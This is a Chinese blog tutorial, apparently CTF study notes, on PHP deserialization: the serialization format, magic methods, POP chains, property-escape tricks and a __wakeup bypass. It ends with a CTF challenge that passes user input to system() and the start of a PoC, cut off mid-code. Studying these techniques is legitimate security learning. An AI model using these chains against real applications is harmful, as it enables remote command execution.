<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 高度简化版</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">php_var_unserialize_internal</span><span class="params">(UNSERIALIZE_PARAMETER, <span class="type">int</span> as_key)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> match <span class="string">&quot;a:&lt;arr_len&gt;&quot;</span> &#123;</span><br><span class="line">        ...</span><br><span class="line">        process_nested_data(UNSERIALIZE_PASSTHRU, ...);</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> match <span class="string">&quot;O:&lt;type&gt;:&lt;cnt_attrs&gt;&quot;</span> &#123;</span><br><span class="line">        ...</span><br><span class="line">        object_common(UNSERIALIZE_PASSTHRU, ...);</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">int</span> <span class="title function_">object_common</span><span class="params">(UNSERIALIZE_PARAMETER, zend_long elements, zend_bool has_unserialize)</span> &#123;</span><br><span class="line">    ...</span><br><span class="line">    process_nested_data(UNSERIALIZE_PASSTHRU, ...);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> zend_always_inline <span class="type">int</span> <span class="title function_">process_nested_data</span><span class="params">(UNSERIALIZE_PARAMETER, HashTable *ht, zend_long elements, zend_object *obj)</span> &#123;</span><br><span class="line">    <span class="keyword">while</span> (elements-- &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        zval key, *data;</span><br><span class="line">        zend_property_info *info = <span class="literal">NULL</span>;</span><br><span class="line">        php_var_unserialize_internal(&amp;key, p, max, <span class="literal">NULL</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="comment">// assert type(key) == string or type(key) == long</span></span><br><span class="line">        <span class="keyword">if</span> (obj) &#123;</span><br><span class="line">            <span class="comment">// assert string(key) in dir(obj)</span></span><br><span class="line">            <span class="comment">// obj[key] = new ref info // zend_get_typed_property_info_for_slot</span></span><br><span class="line">        &#125;</span><br><span class="line">        php_var_unserialize_internal(data, p, max, var_hash, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (info) &#123;</span><br><span class="line">            <span class="comment">// some checks</span></span><br><span class="line">            zend_ref_add_type_source(Z_REF_P(data), info);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 略</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到，当反序列化数组、对象这种东西的时候，只有反序列化 值时会传入 <code>var_hash</code> 这个列表， 键并不存在于这个对象中的列表中。真相大白。</p>
<p>注：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$x</span> = <span class="keyword">array</span>(<span class="keyword">new</span> <span class="built_in">stdClass</span>);</span><br><span class="line"><span class="variable">$x</span>[<span class="number">1</span>] = &amp;<span class="variable">$x</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$x</span>);</span><br><span class="line"><span class="comment">// a:2:&#123;i:0;O:8:&quot;stdClass&quot;:0:&#123;&#125;i:1;a:2:&#123;i:0;r:2;i:1;R:3;&#125;&#125;</span></span><br></pre></td></tr></table></figure>







<h3 id="对象的序列化"><a href="#对象的序列化" class="headerlink" title="对象的序列化"></a>对象的序列化</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$pub</span>=<span class="string">&#x27;benben&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ben</span>=<span class="string">&#x27;laoli&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">jineng</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;pub;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>)</span><br><span class="line"> </span><br><span class="line">    </span><br><span class="line"><span class="comment">//O:4(类名长)&quot;test&quot;（类名）:2(属性数);&#123;s:3(属性名长):&quot;pub&quot;(属性名);s:6(值长):&quot;benben&quot;(值);s:3:&quot;ben&quot;;s:5:&quot;laoli&quot;;&#125;</span></span><br></pre></td></tr></table></figure>



<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641630b7cd36.png" alt="image-20240221200228499"></p>
<p>当属性类型为public时 会将属性名(test)变为’空’类名属性名’空’（%00(url编码后)test%00pub） 所以前面是9</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641630b63d17.png" alt="image-20240221200501785"></p>
<p>同理protected</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641630bdc53d.png" alt="image-20240221200821384"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641630cd4b8d.png" alt="image-20240221200850913"></p>
<p><code>(0*0--&gt;空*空)</code></p>
<p>套娃</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/66416316aa886.png" alt="image-20240221201215657"></p>
<p>把一个序列化的对象赋值给ben了</p>
<h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p>反序列化是将字符串转换成变量或对象的过程</p>
<p>·反序列化之后的内容为一个对象</p>
<p>·反序列化生成的对象里的值由反序列化里的值提供，与原有类预定义的值无关</p>
<p>·反序列化不触发类的方法，除非是魔术方法或调用方法</p>
<h3 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h3><p>成因：反序列化过程中，unserialize()的值可控，通过更改这个值，得到所需要的代码</p>
<h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><h3 id="定义-1"><a href="#定义-1" class="headerlink" title="定义"></a>定义</h3><p>一个预定义好的，在特定情况下<strong>自动触发</strong>的行为方法</p>
<p>魔术方法在特定条件下自动调用相关方法</p>
<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p> <img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641631e96b7c.png" alt="image-20240221205308936"></p>
<h4 id="construct"><a href="#construct" class="headerlink" title="__construct()"></a>__construct()</h4><p>构造函数，在实例化一个对象的时候，首先会去自动执行的一个方法</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641630d21e1e.png" alt="image-20240221205909384"></p>
<h4 id="destruct"><a href="#destruct" class="headerlink" title="__destruct()"></a>__destruct()</h4><p>析构函数，在对象所有的引用被删除或者当对象被显式销毁时执行的魔术方法</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641630e39c9a.png" alt="image-20240221210856966"></p>
<p>在序列化过程中不会触发</p>
<p>在反序列化过程中会触发</p>
<p>实例化对象结束后也会触发</p>
<h4 id="sleep"><a href="#sleep" class="headerlink" title="__sleep()"></a>__sleep()</h4><p>序列化serialize()函数会检查类中是否存在一个魔术方法__sleep(),若存在，则该方法会先被调用，再执行序列化</p>
<p>返回需要被序列化存储的成员属性，删除不必要的属性</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641630dd90a0.png" alt="image-20240221212013413"></p>
<h4 id="wakeup"><a href="#wakeup" class="headerlink" title="__wakeup()"></a>__wakeup()</h4><p>与__sleep()相反</p>
<p>反序列化unserialize()会检查是否存在一个__wakeup()方法，若存在，则会先调用该方法。预先准备对象需要的资源</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641630e5015a.png" alt="image-20240221212801941"></p>
<h4 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString()"></a>__toString()</h4><p>把对象当作字符串调用时触发   echo</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641630d0d34d.png" alt="image-20240221213659411"></p>
<h4 id="invoke"><a href="#invoke" class="headerlink" title="__invoke()"></a>__invoke()</h4><p>把对象当作函数调用时触发  return</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641630ca4b96.png" alt="image-20240221213830977"></p>
<h4 id="call"><a href="#call" class="headerlink" title="__call()"></a>__call()</h4><p>调用一个不存在的方法时触发  $this-&gt;aa</p>
<p>两个参数<code>$arg1,$arg2</code></p>
<p>返回值：调用的不存在的方法名和参数</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641630e12ba3.png" alt="image-20240221214624310"></p>
<h4 id="callStatic"><a href="#callStatic" class="headerlink" title="__callStatic()"></a>__callStatic()</h4><p>静态调用或者调用成员常量时使用的方法不存在，此时触发</p>
<p>两个参数<code>$arg1,$arg2</code></p>
<p>返回值：调用的不存在的方法和名称的参数</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641630d1c0a4.png" alt="image-20240221214943446"></p>
<h4 id="get"><a href="#get" class="headerlink" title="__get()"></a>__get()</h4><p>调用的成员属性不存在时触发  $this-&gt;aa-&gt;bb</p>
<p>一个参数$arg1</p>
<p>返回值：不存在的属性名</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641630c5f424.png" alt="image-20240221215200717"></p>
<h4 id="set"><a href="#set" class="headerlink" title="__set()"></a>__set()</h4><p>给不存在的属性赋值时触发</p>
<p>两个参数<code>$arg1,$arg2</code></p>
<p>返回值：不存在的属性名和赋的值</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641630d254fe.png" alt="image-20240221215600389"></p>
<h4 id="isset"><a href="#isset" class="headerlink" title="__isset()"></a>__isset()</h4><p>对不可访问属性使用isset()或empty()时，触发</p>
<p>一个参数$arg1</p>
<p>返回值:不存在&#x2F;不可访问的属性名</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641630c57890.png" alt="image-20240221220406133"></p>
<h4 id="unset"><a href="#unset" class="headerlink" title="__unset()"></a>__unset()</h4><p>对不可访问属性使用unset()时触发</p>
<p>一个参数$arg1</p>
<p>返回值：不可访问的成员属性名</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641630c6707c.png" alt="image-20240221220715991"></p>
<h4 id="clone"><a href="#clone" class="headerlink" title="__clone()"></a>__clone()</h4><p>当使用clone关键字拷贝完成一个对象后，新对象会自动调用定义的魔术方法__clone</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641630e21a57.png" alt="image-20240221221003602"></p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641631dba40b.png" alt="image-20240221221040252"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/66416322558fd.png" alt="image-20240221221103912"></p>
<h2 id="POP链"><a href="#POP链" class="headerlink" title="POP链"></a>POP链</h2><h3 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h3><p>例题</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/664163183e444.png" alt="image-20240221222425146"></p>
<p>思路：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641630f488fc.png" alt="image-20240221222455837"></p>
<p>这里的__construction不会被调用，因为没有序列化</p>
<p>法1：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/66416317c6177.png" alt="image-20240221222807543"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641631387598.png" alt="image-20240221222830808"></p>
<p>法2：</p>
<p>1.删去没用的</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641630bcd0b0.png" alt="image-20240221223408086"></p>
<p>2.类外赋值</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641630e243ab.png" alt="image-20240221223556996"></p>
<p>魔术方法触发前提：魔术方法所在类（或对象）被调用</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/664163140ec43.png" alt="image-20240222185057772"></p>
<h3 id="pop链构造与poc编写"><a href="#pop链构造与poc编写" class="headerlink" title="pop链构造与poc编写"></a>pop链构造与poc编写</h3><p>pop链就是利用魔术方法在里面进行多次跳转 然后获取敏感数据的一种payload</p>
<p>poc:概念验证，在安全界可以理解成漏洞验证程序，poc是一段不完整的程序，仅仅是为了证明提出者的观点的一段代码</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/664163242bc9e.png" alt="image-20240222191258816"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641631a54909.png" alt="image-20240222194203684"></p>
<h2 id="字符串逃逸"><a href="#字符串逃逸" class="headerlink" title="字符串逃逸"></a>字符串逃逸</h2><p>反序列化分隔符</p>
<p>反序列化以;}结束,后面的字符不影响正常的反序列化</p>
<p>属性逃逸</p>
<p>一般的数据先经过一次serialize再经过unserialize,在这个中间反序列化的字符串变多或者变少的时候很有可能存在反序列化属性逃逸</p>
<h3 id="减少逃逸"><a href="#减少逃逸" class="headerlink" title="减少逃逸"></a>减少逃逸</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/664163218a2dd.png" alt="image-20240222200324129"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/66416321ba66f.png" alt="image-20240222200602151"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/664163235591a.png" alt="image-20240222215131008"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641631443ca3.png" alt="image-20240222215710380"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641631c96652.png" alt="image-20240222220117373"></p>
<p>例题</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/66416323a3f31.png" alt="image-20240222223402500"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/66416321c36d3.png" alt="image-20240222223656946"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641631794375.png" alt="image-20240222223727807"></p>
<h3 id="增多逃逸"><a href="#增多逃逸" class="headerlink" title="增多逃逸"></a>增多逃逸</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/66416320496e9.png" alt="image-20240222220245356"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/66416316f12c1.png" alt="image-20240222220425811"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641632379a46.png" alt="image-20240222220654985"></p>
<p>例题</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/66416319ea330.png" alt="image-20240222222118718"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641631c618f6.png" alt="image-20240222222353281"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641a0dabde07.png" alt="image-20240222222407358"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641631cabf30.png" alt="image-20240222223129660">                                                                                                                                                                                                                                                       </p>
<h2 id="wakeup绕过"><a href="#wakeup绕过" class="headerlink" title="__wakeup绕过"></a>__wakeup绕过</h2><p>条件：</p>
<p>php5&lt;5.6.25</p>
<p>php7&lt;7.0.10</p>
<p>序列化字符串中表示对象属性个数的值大于真实的属性个数时，会跳过__wakeup()的执行</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/66416320665b2.png" alt="image-20240227194527697"></p>
<p>例</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/664163232c833.png" alt="image-20240227194811041"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/66416323becd6.png" alt="image-20240227194915527"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641631c25bc2.png" alt="image-20240227195002743"></p>
<p><code>+可以绕过正则表达式</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/66416313493c5.png" alt="image-20240227195216055"></p>
<p><strong>当正则过滤R&#x2F;r后数字时  可以用引用绕过</strong></p>
<p>但是__wakeup中要有：<code>$this-&gt;b = $this-&gt;a;</code></p>
<p>帕鲁杯R23</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b-&gt;<span class="title function_ invoke__">love</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">b</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$tmp</span> = <span class="variable language_">$this</span>-&gt;c-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c = <span class="string">&quot;no!&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xk</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">love</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">       <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/R:2|R:3/&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]); </span><br></pre></td></tr></table></figure>

<p>poc:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//show_source(__FILE__);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span>&#123;</span><br><span class="line"><span class="comment">//    public $b;</span></span><br><span class="line"><span class="comment">//    public function __get($a)&#123;</span></span><br><span class="line"><span class="comment">//        $this-&gt;b-&gt;love();</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">b</span></span>&#123;</span><br><span class="line"><span class="comment">//    public $a;</span></span><br><span class="line"><span class="comment">//    public $b;</span></span><br><span class="line"><span class="comment">//    public $c;</span></span><br><span class="line"><span class="comment">//    public function __destruct()&#123;</span></span><br><span class="line"><span class="comment">//        $tmp = $this-&gt;c-&gt;name;</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line"><span class="comment">//    public function __wakeup()&#123;</span></span><br><span class="line"><span class="comment">//        $this-&gt;c = &quot;no!&quot;;</span></span><br><span class="line"><span class="comment">//        $this-&gt;b = $this-&gt;a;</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xk</span></span>&#123;</span><br><span class="line"><span class="comment">//    public function love()&#123;</span></span><br><span class="line"><span class="comment">//        system($_GET[&#x27;a&#x27;]);</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//</span></span><br><span 